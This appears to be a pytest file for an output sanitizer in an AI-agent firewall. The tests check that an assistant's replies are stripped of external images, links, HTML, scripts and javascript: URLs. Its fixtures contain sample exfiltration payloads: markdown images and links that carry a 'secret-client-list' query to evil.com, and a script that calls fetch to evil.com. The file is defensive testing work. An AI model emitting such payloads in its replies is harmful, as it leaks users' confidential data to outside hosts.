"""Tests for `output_sanitizer`: replies must not carry data out through rendered links."""

import pytest
from firewall_app.controls import REGISTRY
from firewall_app.controls.output_sanitizer import OutputSanitizer
from firewall_app.domain import Action, Agent, Check, Message, Stage
from firewall_app.pipeline import run_check
from firewall_app.policy import parse_policy

AGENT = Agent(id="research-assistant", owner="alice@bank.example")
PARAMS = OutputSanitizer.Params(allowed_domains=["*.bank.internal", "bank.internal"])
LEAK = "d=secret-client-list"


def output_check(text: str) -> Check:
    return Check(stage=Stage.output, agent=AGENT, message=Message(role="assistant", content=text))


async def evaluate(text: str, params=PARAMS):
    return await OutputSanitizer().evaluate(output_check(text), params)


async def rewritten(text: str, params=PARAMS) -> str:
    verdict = await evaluate(text, params)
    assert verdict.action == Action.block
    return verdict.rewritten.message.content


def test_registered():
    assert REGISTRY.get("output_sanitizer") is OutputSanitizer
    assert OutputSanitizer.stages == {Stage.output}


@pytest.mark.parametrize(
    "text",
    [
        "Plain prose with no links at all.",
        "See ![diagram](https://docs.bank.internal/d.png)",
        "Read the [guide](/wiki/x) first.",
        "Mail [the desk](mailto:desk@bank.example).",
        "Home: [intranet](https://bank.internal/)",
    ],
)
async def test_allowed(text):
    verdict = await evaluate(text)
    assert verdict.action == Action.allow
    assert verdict.findings == []


async def test_missing_message_is_allowed():
    verdict = await OutputSanitizer().evaluate(Check(stage=Stage.output, agent=AGENT), PARAMS)
    assert verdict.action == Action.allow


async def test_external_image_removed_with_alt_text():
    text = f"Done ![client list](https://evil.com/log?{LEAK}) ok"
    assert await rewritten(text) == "Done [image removed: evil.com] ok"
    (finding,) = (await evaluate(text)).findings
    assert finding.type == "external_image"
    assert finding.detail == "image to evil.com"


async def test_external_link_keeps_text():
    text = f"[click here](https://evil.com/?{LEAK} \"title\")"
    assert await rewritten(text) == "click here [link removed: evil.com]"


async def test_reference_link():
    text = f"See [docs][1].\n\n[1]: https://evil.com/?{LEAK}"
    assert await rewritten(text) == "See [docs][1].\n\n[1]: [link removed: evil.com]"


async def test_html_img_tag():
    assert await rewritten('x <img src="https://evil.com/x"> y') == "x [html removed] y"
    assert (await evaluate('<img src="https://evil.com/x">')).findings[0].type == "html"


async def test_script_block():
    text = "a <script>fetch('https://evil.com')</script> b"
    assert await rewritten(text) == "a [script removed] b"


async def test_event_handler_on_allowed_image():
    text = '<img src="https://docs.bank.internal/x.png" onerror="fetch(1)">'
    assert await rewritten(text) == "[script removed]"


async def test_javascript_link_even_without_allowlist():
    params = OutputSanitizer.Params()
    assert await rewritten("[click](javascript:alert(1))", params) == "click [script removed]"
    assert await rewritten("[x](JavaScript:alert(1))", params) == "x [script removed]"
    assert (await evaluate("[click](javascript:alert(1))", params)).findings[0].type == "script"


async def test_protocol_relative_url():
    assert await rewritten("![](//evil.com/x)") == "[image removed: evil.com]"


async def test_wildcard_boundaries():
    only_wildcard = OutputSanitizer.Params(allowed_domains=["*.bank.internal"])
    assert await rewritten("![](https://bank.internal/x)", only_wildcard) == (
        "[image removed: bank.internal]"
    )
    assert await rewritten("![](https://evil-bank.internal/x)", only_wildcard) == (
        "[image removed: evil-bank.internal]"
    )
    assert (await evaluate("![](https://DOCS.Bank.Internal/x)", only_wildcard)).findings == []


@pytest.mark.parametrize(
    "flag, text",
    [
        ("images", "![a](https://evil.com/x)"),
        ("links", "[a](https://evil.com/x)"),
        ("links", "[1]: https://evil.com/x"),
        ("html", '<img src="https://evil.com/x">'),
        ("scripts", "<script>alert(1)</script>"),
        ("scripts", "[a](javascript:alert(1))"),
    ],
)
async def test_each_flag_off_leaves_its_kind(flag, text):
    params = PARAMS.model_copy(update={flag: False})
    if flag == "scripts" and text.startswith("[a]"):
        # A javascript: link has no host, so with scripts off it is just a relative link.
        params = params.model_copy(update={"links": True})
    assert (await evaluate(text, params)).action == Action.allow


async def test_leaked_query_never_in_reason_or_detail():
    text = (f"![a](https://evil.com/i?{LEAK}) [b](https://evil.com/l?{LEAK}) "
            f'<img src="https://evil.com/h?{LEAK}">')
    verdict = await evaluate(text)
    assert len(verdict.findings) == 3
    assert LEAK not in verdict.reason
    assert all(LEAK not in f.detail and "/i" not in f.detail for f in verdict.findings)
    assert LEAK not in verdict.rewritten.message.content


def policy_with_mode(mode: str):
    return parse_policy(
        f"controls:\n  output_sanitizer:\n    mode: {mode}\n"
        "    params:\n      allowed_domains: ['*.bank.internal']\n",
        REGISTRY,
    )


EXFIL = f"Summary ![x](https://evil.com/?{LEAK})"


async def test_redact_mode_strips():
    result = await run_check(output_check(EXFIL), policy_with_mode("redact"))
    assert result.decision.action == Action.redact
    assert result.after.message.content == "Summary [image removed: evil.com]"


async def test_block_mode_blocks():
    result = await run_check(output_check(EXFIL), policy_with_mode("block"))
    assert result.decision.action == Action.block
    assert result.decision.reason.startswith("Blocked by output_sanitizer")


async def test_monitor_mode_records():
    result = await run_check(output_check(EXFIL), policy_with_mode("monitor"))
    assert result.decision.action == Action.allow
    assert result.decision.findings
    assert result.after.message.content == EXFIL
